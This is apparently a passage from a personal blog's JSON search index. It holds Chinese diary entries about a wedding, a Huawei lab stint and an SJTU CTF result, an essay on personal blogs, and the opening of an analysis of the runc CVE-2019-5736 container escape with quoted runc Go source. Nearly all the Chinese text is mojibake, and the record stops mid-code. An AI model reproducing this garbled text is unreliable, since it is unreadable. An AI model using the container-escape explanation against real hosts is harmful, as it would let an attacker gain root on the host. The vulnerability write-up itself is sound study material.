å©šç¤¼æ˜¯ä¸­å¼ä¸è¥¿å¼ç»“åˆçš„å½¢å¼ï¼šç©¿ç€ä¸­å¼çš„çº¢è‰²é¾™å‡¤è¤‚ï¼ˆæŸ¥äº†ä¸€ä¸‹æ‰çŸ¥é“åŸæ¥å«è¿™åå­—ï¼‰å»æ¥äº²ã€‚æ¥äº²çš„è½¦é˜Ÿåˆ°è¾¾é…’åº—ä¹‹åï¼Œæ–°éƒæ–°å¨˜å†æ¢ä¸Šè¥¿å¼çš„è¥¿è£…ä¸å©šçº±ï¼Œè¿›è¡Œè¥¿å¼çš„å©šç¤¼æµç¨‹ã€‚ å©šç¤¼ç»“æŸä¹‹åï¼Œæˆ‘åœ¨å®¶å¾…åˆ°äº†4å·ã€‚æœŸé—´å›äº†è€å®¶ä¸€æ¬¡ï¼Œå‰©ä¸‹çš„æ—¶é—´éƒ½åœ¨å®¶é‡Œä¼‘æ¯ã€‚5å·æ—©æ™¨ï¼Œæˆ‘çˆ¸é€æˆ‘åˆ°é«˜é€Ÿå£ï¼Œç„¶åæˆ‘æ­ä¹˜å¦ä¸€ä¸ªè¡¨å“¥è¿”æ­çš„é¡ºé£è½¦ï¼Œè·Ÿä»–ä¸€èµ·å›äº†æ­å·ã€‚7å·ä¸­åˆï¼Œæˆ‘æ‰å†ä»æ­å·ä¸œç«™å‡ºå‘ï¼Œä¹˜é«˜é“å›åˆ°ä¸Šæµ·ã€‚ ä»”ç»†å›æƒ³ï¼Œè¿™å¥½åƒæ˜¯æˆ‘ä»å»å—æ˜Œè¯»é«˜ä¸­ä»¥æ¥ï¼Œç¬¬ä¸€æ¬¡åœ¨å›½åº†æœŸé—´å›å®¶ã€‚ä¸çŸ¥ä¸è§‰é—´ï¼Œæˆ‘å·²ç»æœ‰8å¹´åœ¨å®¶ä»¥å¤–çš„åœ°æ–¹åº¦è¿‡ä¸€å¹´ä¸­çš„å¤§å¤šæ•°æ—¶é—´äº†ã€‚é¥æƒ³å½“æ—¶åˆšåˆšç»“æŸåˆä¸‰çš„æˆ‘ï¼Œè‚¯å®šä¹Ÿæƒ³ä¸åˆ°å°†æ¥çš„è‡ªå·±ä¼šæœ‰æ€æ ·çš„ç»å†ã€‚ ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:2:1","series":null,"tags":["Life","ç”Ÿæ´»","éšç¬”","æ…¢èŠ‚å¥"],"title":"10æœˆéšç¬”","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#å‚åŠ å©šç¤¼"},{"categories":["éšæ„çš„æ–‡å­—"],"content":"ä¸Šç ”\u0026Huawei ç¬¬äºŒä»¶äº‹åˆ™æ˜¯èŠ±äº†2å‘¨çš„æ—¶é—´ï¼Œå®Œæˆäº†ä¸åä¸ºåˆä½œçš„å®éªŒå®¤é¡¹ç›®çš„ä¸€ä¸ªå°ä»»åŠ¡ã€‚å…·ä½“å·¥ä½œå†…å®¹ä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œå¹¶ä¸æ˜¯æˆ‘æ„Ÿå…´è¶£çš„é¢†åŸŸï¼Œæ‰€ä»¥åœ¨é‚£è¾¹çš„å·¥ä½œç§¯æåº¦ä¹Ÿå¹¶ä¸é«˜ã€‚å¥½åœ¨æœ€ç»ˆå’Œå¦å¤–ä¸€ååŒå­¦åˆä½œï¼Œå–å¾—äº†ä¸€ç‚¹èƒ½å¤Ÿåœ¨é¡¹ç›®ä¾‹ä¼šä¸Šæä¸€å˜´çš„å·¥ä½œæˆæœï¼Œä¹Ÿç®—æ˜¯ç»™å¯¼å¸ˆäº¤å·®äº†ã€‚ åœ¨é‚£é‡Œçš„ä¸¤å‘¨æœ‰ä¸¤ä»¶äº‹ä»¤æˆ‘å°è±¡æ·±åˆ»ï¼ŒåŒæ—¶ä¹Ÿæ˜¯å€¼å¾—åæ§½çš„ä¸¤ç‚¹ï¼šç¬¬ä¸€ç‚¹ï¼Œä¸Šæµ·å…¨å­£é…’åº—çš„æ—©é¤çœŸçš„ä¸æ•¢æ­ç»´ï¼Œå“ç§å•ä¸€ï¼Œè¿ç€ä½ä¸€ä¸ªç¤¼æ‹œç»å¯¹ä¼šè®©ä½ åƒè…»ã€‚è¦ä¸æ˜¯ä¸ºäº†æ–¹ä¾¿ï¼Œæ—©ä¸Šèƒ½å¤Ÿå¤šç¡é‚£ä¹ˆå‡ åˆ†é’Ÿï¼Œæˆ‘çœŸçš„å°±å»å¤–é¢çš„æ—©é¤åº—ä¹°æ—©é¤äº†ã€‚ç¬¬äºŒç‚¹ï¼Œåä¸ºä¸Šç ”æ‰€å†…éƒ¨çš„äººå‘˜æµåŠ¨ç®¡ç†çœŸçš„å·¨ä¸¥æ ¼ï¼Œè¿™ç§ä¸¥æ ¼ç”šè‡³è®©æˆ‘å›æƒ³èµ·äº†å°å­¦å¿˜æˆ´çº¢é¢†å·¾è€Œè¢«æ‹¦åœ¨æ ¡é—¨å¤–çš„ä½“éªŒã€‚ä»ä¸œèæºªæ‘è¿‡æ¥çš„è´Ÿè´£å¯¹æ¥æˆ‘ä»¬çš„åŒäº‹ä¹Ÿå¯¹æ­¤æ„Ÿåˆ°è¯§å¼‚å’Œæ— è¯­ğŸ˜…ï¼Œä¸Šç ”å†…éƒ¨äººå‘˜é€šè¡Œè§„åˆ™çš„ä¸¥æ ¼ä¸å¤æ¿å¯è§ä¸€æ–‘ã€‚ åœ¨ä½äº†2ä¸ªç¤¼æ‹œçš„é…’åº—ä¹‹åï¼Œæˆ‘ç»ˆäºå›åˆ°äº†å­¦æ ¡ï¼Œå¹¶ä¸”åˆä¸€æ¬¡æ·±æ·±åœ°æ„Ÿå—åˆ°äº†å½“ä»£æ‰“å·¥äººåœ¨ç»“æŸå·¥ä½œä¹‹åé¢å¯¹å°†è¦æ¥ä¸´çš„å‡æœŸæ—¶çš„é‚£ä»½æ»¡æ»¡çš„å¹¸ç¦æ„Ÿã€‚ ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:2:2","series":null,"tags":["Life","ç”Ÿæ´»","éšç¬”","æ…¢èŠ‚å¥"],"title":"10æœˆéšç¬”","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#ä¸Šç ”huawei"},{"categories":["éšæ„çš„æ–‡å­—"],"content":"SJTU-CTF-2021 ç¬¬ä¸‰ä»¶äº‹æ˜¯ä»Šå¹´çš„æ ¡èµ›ã€‚SJTU-CTF-2021ï¼Œå¼€å§‹äº2021.10.11 8:00AMï¼Œç»“æŸäº2021.10.25 8ï¼š00PMï¼ˆè¿™ä¹ˆé•¿æ—¶é—´çš„æ¯”èµ›ï¼ŒçœŸæ˜¯å·å¾—æˆ‘å¤Ÿç´¯çš„ğŸ˜«é€‚åˆä¸€è¾¹å­¦ä¹ ä¸€è¾¹åšé¢˜ï¼‰ã€‚ 19å¹´çš„æ ¡èµ›ï¼Œæˆ‘åšå‡ºäº†ä¸€é“å¯†ç é¢˜ã€‚å½“æ—¶ç®—æ˜¯é€šè¿‡è¿™æ¬¡æ¯”èµ›çŸ¥é“äº†CTFè¿™ä¹ˆä¸€ä¸ªä¸œè¥¿ï¼Œæ¯”èµ›ä¹‹åä¹Ÿå°±æ²¡æœ‰å»å…³æ³¨è¿‡ç›¸å…³æ–¹é¢å¾—å†…å®¹äº†ã€‚ 20å¹´çš„æ ¡èµ›ï¼Œæˆ‘å­¦ä¹ äº†ä¸€ç‚¹ç‚¹åŸºç¡€çŸ¥è¯†ï¼Œæƒ³ç€è¿™æ¬¡åº”è¯¥å¯ä»¥æœ‰ç‚¹ä¸ä¸€æ ·çš„ä½“éªŒäº†ã€‚ä½†ç”±äºæ—¶é—´å†²çªä»¥åŠçŸ¥è¯†å‚¨å¤‡ä¸å¤Ÿç­‰åŸå› ï¼Œæœ€åè¿˜æ˜¯åªåšäº†3é“è¿˜æ˜¯4é“é¢˜ï¼Œæ’å40+ã€‚ 21å¹´çš„æ ¡èµ›ï¼Œç»ˆäºç»ˆäºæœ‰äº†ä¸€ç‚¹ç‚¹è¿›æ­¥ã€‚è¿™æ¬¡ç”±äºæ¯”èµ›ç¬¬ä¸€å¤©æäº¤äº†2é“ç®€å•é¢˜ï¼Œæ‰€ä»¥åœ¨ä¸€å¼€å§‹å°±æ’è¿›äº†å‰10ï¼ˆçœŸæ­£çš„å¤§ä½¬éƒ½æ˜¯åé¢æ‰å¼€å§‹äº¤flagçš„ï¼‰ã€‚ç„¶åæˆ‘å°±è¢«è¿™å‰10çš„æ’åç»™æ‹¿æä½äº†ï¼Œå› ä¸ºä¸æƒ³è®©è‡ªå·±çš„æ’åæ‰å¤ªå¤šï¼Œæ‰€ä»¥æ¯å¤©éƒ½è¢«è¿«åœ¨å·å„ä¸ªåˆ†ç±»çš„é¢˜ï¼ˆwebé™¤å¤–ï¼‰ã€‚å†åŠ ä¸Šè¿™æ¬¡æ ¡èµ›å’Œä¸Šç ”æ‰€é‚£2å‘¨åŸºæœ¬ä¸Šæ˜¯å®Œç¾é‡åˆçš„ï¼Œæ‰€ä»¥æˆ‘åœ¨10.11åˆ°10.25è¿™æ®µæ—¶é—´é‡Œï¼ŒåŸºæœ¬å°±æ˜¯ç™½å¤©ä¸Šç­ï¼Œæ™šä¸Šåšé¢˜ã€‚æœ€åå‡­å€Ÿè¿æ°”åŠ ä¸Šä¸€ç‚¹ç‚¹å®åŠ›ï¼Œæ‹¿åˆ°äº†ç¬¬5çš„åæ¬¡ï¼Œå·²ç»ç®—æ˜¯è¿œè¿œè¶…å‡ºé¢„æœŸäº†ğŸ˜†ã€‚ Trendimage-20211031222357878 \" Trend å®Œæ•´çš„scoreboardimage-20211031222109931 \" å®Œæ•´çš„scoreboard ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:2:3","series":null,"tags":["Life","ç”Ÿæ´»","éšç¬”","æ…¢èŠ‚å¥"],"title":"10æœˆéšç¬”","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#sjtu-ctf-2021"},{"categories":["éšæ„çš„æ–‡å­—"],"content":"åè®° 25å·ç»“æŸæ¯”èµ›ï¼Œ26å·äº¤å®Œwriteupã€‚ä¹‹ååœ¨å­¦æ ¡é‡Œæ‘¸äº†å‡ å¤©é±¼ï¼Œå°±åˆ°äº†æœˆåº•äº†ã€‚ è¿™ç¯‡éšç¬”çš„åˆ›å»ºæ—¥æœŸæ˜¯10.28ï¼Œä½†å®é™…ä¸Šæˆ‘ä¸€ç›´æ‹–åˆ°äº†ä»Šå¤©ï¼Œä¹Ÿå°±æ˜¯10.31å·æ‰å†™å®Œã€‚å›å¤´ä¸€çœ‹ï¼Œä¸€ä¸ªæœˆçš„æ—¶é—´è¿‡å¾—è¿˜æ˜¯å¾ˆå¿«çš„ã€‚å¸Œæœ›å³å°†åˆ°æ¥çš„11æœˆèƒ½å¤Ÿå¹³ç¨³ã€å……å®åœ°åº¦è¿‡ï¼Œå¸Œæœ›è‡ªå·±èƒ½å¤Ÿå¤šè¯»ä¹¦ï¼Œå¤šå­¦ä¹ ï¼Œå¤šè¿åŠ¨ï¼Œç»§ç»­å‰è¿›ã€‚ ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:3:0","series":null,"tags":["Life","ç”Ÿæ´»","éšç¬”","æ…¢èŠ‚å¥"],"title":"10æœˆéšç¬”","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#åè®°"},{"categories":["éšæ„çš„æ–‡å­—"],"content":"ä¸çŸ¥é“ä»ä»€ä¹ˆæ—¶å€™èµ·ï¼Œæˆ‘å¼€å§‹æ¸æ¸å–œæ¬¢ä¸Šé˜…è¯»ä¸€äº›ä¼˜ç§€çš„ä¸ªäººåšå®¢ã€‚ä¸è®ºæ˜¯å­¦ä¹ çŸ¥è¯†ä¹Ÿå¥½ï¼Œæ‹“å®½è§†é‡ä¹Ÿå¥½ï¼ŒæŠ‘æˆ–æ˜¯ä½œä¸ºé¡¹ç›®ä»»åŠ¡ä¹‹ä½™å·æ‡’æ”¾æ¾çš„ä¸€ç§æ–¹å¼ä¹Ÿå¥½ï¼Œä¼˜ç§€çš„åšå®¢æ€»æ˜¯èƒ½å¤Ÿä»¤æˆ‘æ„è¯†åˆ°è‡ªèº«çš„è¯¸å¤šä¸è¶³ï¼Œä¹Ÿæˆ–å¤šæˆ–å°‘ç»™è‡ªå·±å¢åŠ äº†ä¸€äº›è¿›æ­¥çš„æ¬²æœ›å’ŒåŠ¨åŠ›ã€‚ æˆ‘è®¤ä¸ºï¼Œé˜…è¯»åšå®¢æœ‰è¿™ä¹ˆå‡ ä¸ªå¥½å¤„ã€‚ é¦–å…ˆï¼Œä¸ªäººåšå®¢æ˜¯ä¸€ç§å¾ˆå¥½çš„ä¿¡æ¯è½½ä½“ã€‚å®ƒä¸åŒäºç°åœ¨çš„å¤§å¤šæ•°äººæ‰€ä¹ æƒ¯çš„æ–°é—»åª’ä½“æ¨é€ã€æœ‹å‹åœˆã€çŸ­è§†é¢‘ç­‰ä¿¡æ¯ä¼ æ’­æ–¹å¼ï¼Œåè€Œæ›´åŠ åƒè¿‡å»çš„ä¹¦ä¿¡ã€‚è§†é¢‘å›¾ç‰‡ç­‰æ–¹å¼å›ºç„¶ç›´æ¥äº†å½“ï¼Œä¸”éå¸¸é€‚åˆåœ¨çŸ­æ—¶é—´å†…ä¼ é€’å¤§é‡ä¿¡æ¯ï¼Œä½†æ˜¯ç™½åº•é»‘å­—å´å¾€å¾€æ›´èƒ½å¤Ÿè§¦åŠ¨æˆ‘ä»¬çš„å†…å¿ƒã€‚è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œæˆ‘è®¤ä¸ºæœ‹å‹åœˆã€çŸ­è§†é¢‘ç­‰ä¿¡æ¯ä¼ é€’æ–¹å¼è®©æˆ‘ä»¬éƒ½æ¸æ¸ä¹ æƒ¯äºå¿«èŠ‚å¥çš„ç”Ÿæ´»äº†ï¼Œé•¿æ­¤ä»¥å¾€ï¼Œå®¹æ˜“ä½¿äººå¤±å»å¯¹äº‹ç‰©çš„è€å¿ƒã€‚è­¬å¦‚è¿‡å»çš„æˆ‘ï¼Œæˆ–è€…æ˜¯è¿‡å»åˆ°ç°åœ¨çš„æˆ‘ã€‚æ‰€ä»¥æˆ‘è®¤ä¸ºï¼Œå¤šè¯»åšå®¢ï¼Œå¤šåšä¸€äº›éœ€è¦ä¸“æ³¨çš„äº‹æƒ…ï¼Œåº”è¯¥ä¼šè®©å†…å¿ƒæ›´åŠ å¹³ç¨³ä¸”å……å®ã€‚ å…¶æ¬¡ï¼Œä¸ªäººåšå®¢å†…å®¹å¤šå…ƒï¼Œåšä¸»çš„å·¥ä½œã€å­¦ä¹ ã€ç”Ÿæ´»éƒ½ä¸å°½ç›¸åŒã€‚è¿™å…¶å®æ˜¯å¾ˆæœ‰è¶£çš„ä¸€ç‚¹ã€‚è¦çŸ¥é“ï¼Œåšå®¢é¢å‰ä¼—ç”Ÿå¹³ç­‰ï¼Œæœ‰çš„å¯èƒ½åªæœ‰åŸŸåå’Œä¸»é¢˜çš„åŒºåˆ«ï¼Œå¤§å®¶å†™çš„ä¸œè¥¿éƒ½å¯ä»¥å¾ˆå¹³ç­‰åœ°è¢«çœ‹è§ï¼ˆä¸è¿‡æˆ‘ä¸ç¡®å®šæœ‰æ²¡æœ‰ä¹°æœç´¢å¼•æ“æ•°æ®çš„ç°è±¡ï¼‰ã€‚çœ‹çš„åšå®¢å¤šäº†ï¼Œè§†é‡ä¼šè¢«æ‹“å®½ï¼Œå¹¶ä¸”èƒ½å¤Ÿçœ‹åˆ°å¾ˆå¤šå…¶å®ƒé¢†åŸŸçš„æœ‰è¶£ä¹‹å¤„ã€‚è€Œåœ¨å®é™…ç”Ÿæ´»ä¸­ï¼Œè¿™æ ·çš„æœºä¼šç¡®å®æ˜¯å¾ˆéš¾å¾—çš„ã€‚ æœ€åä¸€ç‚¹ï¼Œä¹Ÿæ˜¯æˆ‘è®¤ä¸ºæœ€èƒ½ä½“ç°ä¸ªäººåšå®¢ä»·å€¼çš„ä¸€ç‚¹ã€‚ä¸€ä¸ªåˆæ ¼çš„ä¸ªäººåšå®¢å¾€å¾€åæ˜ äº†åšä¸»åœ¨ä¸€æ®µæ—¶é—´å†…çš„ç”Ÿæ´»çŠ¶æ€ï¼Œè¿™æ®µæ—¶é—´å¯èƒ½æ˜¯ä»åˆšåˆšå¤§å­¦æ¯•ä¸šèµ°ä¸Šå·¥ä½œå²—ä½ï¼Œåˆ°å·¥ä½œæ»¡ä¸€å¹´ï¼›ä¹Ÿå¯èƒ½æ˜¯ä»é«˜ä¸­å¼€å§‹ç©ACMï¼Œåˆ°å·²ç»æˆä¸ºç›¸å…³èŒä¸šé¢†åŸŸçš„å·¨ä½¬ã€‚ç‚¹å‡»å½’æ¡£æˆ–è€…Archiveï¼Œé˜…è¯»ä¸åŒæ—¶é—´æ®µçš„åšæ–‡ï¼Œæˆ‘æ€»èƒ½å¤Ÿæ„Ÿå—åˆ°æ—¶é—´ç»™äºˆä¸€ä¸ªäººçš„æˆé•¿ä¸å˜åŒ–ï¼Œä»è€Œä½“ä¼šåˆ°äººç”Ÿçš„ç¾å¥½ï¼Œç”šè‡³æˆ–å¤šæˆ–å°‘é¢†æ‚Ÿäº†ä¸€äº›ç”Ÿæ´»çš„æ„ä¹‰ã€‚é˜…è¯»ç½‘ç»œä¸Šçš„å¤§ä½¬ä»¬çš„åšæ–‡çš„æ—¶å€™ï¼Œæˆ‘ä¼¼ä¹ä¹Ÿèƒ½å¤Ÿçœ‹åˆ°å‘å¸ƒè¿™ç¯‡åšæ–‡ä¹‹å‰ï¼Œååœ¨åŒæ ·çš„æ–‡å­—é¢å‰çš„åšä¸»ï¼Œèƒ½å¤Ÿæƒ³è±¡å¯¹æ–¹é‡åˆ°çš„å›°éš¾ä¸è§£å†³é—®é¢˜çš„è¿‡ç¨‹ï¼Œè¿˜æœ‰ä¸€æ¬¡æ¬¡å†™ä¸‹åšå®¢æ—¶çš„ä¸ªäººè¿›æ­¥ä¸æé«˜ã€‚è¿™ï¼Œä¹Ÿæ˜¯å¾ˆéš¾ä»å…¶å®ƒé€”å¾„è·å¾—çš„å¿«ä¹å•Šã€‚å°±åƒæ”¶åˆ°ä¸€å°è¿œæ–¹å‹äººçš„ä¿¡ä»¶ä¸€æ ·ï¼Œæ–‡å­—ä¹‹é—´æ€»æ˜¯å¾ˆæ¸©æš–ã€‚ å·®ä¸å¤šå°±æ˜¯è¿™ä¹ˆä¸€äº›äº†ï¼Œæ·±çŸ¥æˆ‘ç›®å‰çš„æ–‡å­—åŠŸåº•æš‚æ—¶è¿˜å¾ˆéš¾å†™å‡ºè®©è‡ªå·±æ»¡æ„çš„æ–‡ç« ï¼Œä½†ä¹Ÿæ­£å¦‚ä¹‹å‰æ‰€è¯´çš„ä¸€æ ·ï¼Œç›¸ä¿¡åœ¨å†™ä¸‹ä¸€ç¯‡ç¯‡åšæ–‡çš„ä¹‹åï¼Œæˆ‘åº”è¯¥ä¹Ÿèƒ½åœ¨è¿™æ–¹é¢å–å¾—ä¸€äº›å°å°çš„è¿›æ­¥å§ã€‚ æœ€åï¼Œå°±ç”¨ã€Œæ ‘å“¥ã€åšå®¢é‡Œçš„ä¸€å¥è¯ä½œä¸ºè¿™ç¯‡éšç¬”çš„ç»“è¯­å§ã€‚ åœ¨è¿™é‡Œï¼Œæ„Ÿè°¢äº’è”ç½‘çš„å¼€æ”¾ä¸å…±äº«ç²¾ç¥ï¼Œæ„Ÿè°¢æ¯ä¸€ä½æ— ç§åˆ†äº«ç»éªŒçš„é™Œç”Ÿäººã€‚ ğŸ™‚ ","date":"2021-09-26","objectID":"/2021-09-26-%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/:0:0","series":null,"tags":["Life","ç”Ÿæ´»","éšç¬”","æ…¢èŠ‚å¥"],"title":"å…³äºä¸ªäººåšå®¢çš„ä¸€äº›æƒ³æ³•","uri":"/2021-09-26-%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/#"},{"categories":["æºç é˜…è¯»"],"content":"å±äºæ˜¯è¡¥é”…äº† å¤§æ¦‚ä¸€å‘¨å‰ï¼ŒEricè®¤ä¸ºæˆ‘å†™çš„è¿™ç¯‡æ–‡æ¡£å¤ªåƒäº†ã€‚åæ¥æˆ‘ä»”ç»†è¯»äº†ä¸€éï¼Œå‘ç°ç¡®å®å†™çš„æŒºæ··ä¹±çš„ï¼Œè®²è¿°ä¹Ÿä¸æ¸…æ™°ã€‚å¸Œæœ›è¿™ç¬¬ä¸‰ç‰ˆè‡³å°‘èƒ½å¤Ÿè®©å°†æ¥çš„è‡ªå·±çœ‹å¾—æ‡‚å§ã€‚ ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:0:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#"},{"categories":["æºç é˜…è¯»"],"content":"æ¼æ´èƒŒæ™¯ runcæ˜¯ä¸€ä¸ªæ ¹æ®OCI(Open Container Initiative)æ ‡å‡†åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ˜¯Dockerçš„åº•å±‚å®¹å™¨è¿è¡Œæ—¶ã€‚ CVE-2019-5736æ˜¯ç”±æ³¢å…°çš„ä¸€æ”¯ctfæˆ˜é˜ŸDragon Sectoråœ¨2019å‘ç°çš„å…³äºruncçš„æ¼æ´ã€‚èµ·å› æ˜¯ä»–ä»¬åœ¨å‚åŠ ä¸€åœºctfæ¯”èµ›ä¹‹åï¼Œå‘ç°æ¯”èµ›ä¸­çš„ä¸€é“æ²™ç®±é€ƒé€¸é¢˜çš„åŸç†ä¸runcçš„å®ç°åŸç†ç±»ä¼¼ã€‚åœ¨è¿™ä¹‹åä»–ä»¬å¯¹runcè¿›è¡Œäº†ç›¸å…³çš„æ¼æ´æŒ–æ˜å·¥ä½œï¼Œå¹¶ä¸”æˆåŠŸå‘ç°äº†runcä¸­å­˜åœ¨çš„èƒ½å¤Ÿè¢«ç”¨æ¥è¦†ç›–å®¿ä¸»æœºä¸Šruncæ–‡ä»¶çš„å®¹å™¨é€ƒé€¸æ¼æ´ï¼Œè¯¥æ¼æ´çš„CVEç¼–å·ä¸ºCVE-2019-5736ã€‚ åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹å®¹å™¨å†…å¯æ‰§è¡Œæ–‡ä»¶çš„æ–¹å¼ï¼Œè·å–åˆ°å®¿ä¸»æœºä¸Šruncå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„ï¼Œç„¶åè¿›è¡Œè¦†ç›–æ“ä½œï¼Œå°†runcæ›¿æ¢ä¸ºå¯æ§çš„æ¶æ„æ–‡ä»¶ã€‚æœ€ç»ˆå¯é€ æˆåœ¨å®¿ä¸»æœºä¸Šä»¥rootæƒé™æ‰§è¡Œä»»æ„ä»£ç çš„ä¸¥é‡åæœï¼Œå®ç°å®¹å™¨é€ƒé€¸ã€‚ æœ‰å…³è¯¥æ¼æ´çš„è¯¦ç»†å™è¿°å¯è§æ¼æ´çš„oss-securityå‘å¸ƒé‚®ä»¶ä¸dragon sectorçš„å®˜æ–¹åšå®¢ã€‚ å½±å“ç‰ˆæœ¬ï¼šrunc \u003c= 1.0-rc6 ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:1:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#æ¼æ´èƒŒæ™¯"},{"categories":["æºç é˜…è¯»"],"content":"æ¼æ´æˆå›  è¯¥æ¼æ´çš„äº§ç”Ÿä¸»è¦å’ŒLinuxçš„pidå‘½åç©ºé—´ä¸/procä¼ªæ–‡ä»¶ç³»ç»Ÿç›¸å…³ã€‚ å½“ä¸€ä¸ªè¿›ç¨‹åŠ å…¥äº†æŸä¸€pidå‘½åç©ºé—´ä¹‹åï¼Œè¯¥å‘½åç©ºé—´ä¸­çš„å…¶å®ƒè¿›ç¨‹å°±èƒ½å¤Ÿé€šè¿‡/procæ–‡ä»¶ç³»ç»Ÿè§‚å¯Ÿåˆ°è¯¥è¿›ç¨‹ï¼Œåœ¨æƒé™å…è®¸çš„æƒ…å†µä¸‹ï¼Œè¿›ç¨‹èƒ½å¤Ÿé€šè¿‡/proc/[pid]/exeæ‰¾åˆ°å…¶å®ƒè¿›ç¨‹å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ è€Œå¦‚æœå°†è¿™ç§æƒ…å†µæ”¾åˆ°runc initæ‰§è¡Œè¿‡ç¨‹ä¸­æ¥çœ‹ï¼Œrunc initè¿›ç¨‹åœ¨è¿›å…¥äº†å®¹å™¨çš„å‘½åç©ºé—´ä¹‹åï¼Œå¦‚æœå®¹å™¨å†…éƒ¨çš„æ–‡ä»¶èƒ½å¤Ÿæ¬ºéª—runc initè¿›ç¨‹æ‰§è¡Œè‡ªèº«ï¼Œé‚£ä¹ˆå®¹å™¨å†…çš„è¿›ç¨‹å°±èƒ½å¤Ÿé€šè¿‡/procè·å–åˆ°å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶å¥æŸ„ï¼Œä»è€Œè¿›è¡Œè¦†ç›–ç­‰æ”»å‡»æ“ä½œã€‚ æ­£å¸¸çš„åˆ›å»ºå®¹å™¨å¹¶åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤çš„è¿‡ç¨‹ç¤ºæ„å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå…·ä½“æµç¨‹è§ä¸‹æ–‡ä»£ç åˆ†æï¼‰ã€‚ æ­£å¸¸æµç¨‹æ­£å¸¸æµç¨‹ \" æ­£å¸¸æµç¨‹ è€Œä¿®æ”¹äº†å¾…æ‰§è¡Œæ–‡ä»¶çš„å†…å®¹ä¹‹åï¼Œrunc initè¿›ç¨‹ä¼šæ‰§è¡Œè‡ªèº«ï¼Œä»è€Œå°†å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶æš´éœ²ç»™äº†å®¹å™¨å†…éƒ¨ï¼Œé€ æˆå®‰å…¨é£é™©ã€‚ è¢«æ”»å‡»è¢«æ”»å‡» \" è¢«æ”»å‡» ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:2:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬ä¸‰ç‰ˆ","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#æ¼æ´æˆå› "},{"categories":["æºç é˜…è¯»"],"content":"å…·ä½“ä»£ç åˆ†æ runcå¯åŠ¨å®¹å™¨çš„è¿‡ç¨‹ runc runå¯¹åº”çš„commandåœ¨run.goä¸­è¢«å®šä¹‰ // default action is to start a container var runCommand = cli.Command{ Name: \"run\", Usage: \"create and run a container\", ... Action: func(context *cli.Context) error { if err := checkArgs(context, 1, exactArgs); err != nil { return err } status, err := startContainer(context, CT_ACT_RUN, nil) if err == nil { // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) } return fmt.Errorf(\"runc run failed: %w\", err) }, } å¯¹åº”çš„Actionä¼šæ‰§è¡ŒstartContainer()å‡½æ•°ã€‚è¯¥å‡½æ•°ä¼šè¯»å–å®¹å™¨é…ç½®æ–‡ä»¶config.jsonçš„ä¿¡æ¯ï¼Œç”Ÿæˆspecå¯¹è±¡ï¼Œå†å°†å…¶ä½œä¸ºå‚æ•°é€šè¿‡createContainer()ç”Ÿæˆcontainerå¯¹è±¡ã€‚é€šè¿‡åŒ…å«containerå¯¹è±¡çš„runnerå¯¹è±¡è°ƒç”¨r.run()å¯åŠ¨å®¹å™¨ã€‚ func startContainer(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { if err := revisePidFile(context); err != nil { return -1, err } //è¯»å–é…ç½®æ–‡ä»¶ï¼Œè·å–é…ç½®ä¿¡æ¯ spec, err := setupSpec(context) if err != nil { return -1, err } id := context.Args().First() if id == \"\" { return -1, errEmptyID } notifySocket := newNotifySocket(context, os.Getenv(\"NOTIFY_SOCKET\"), id) if notifySocket != nil { if err 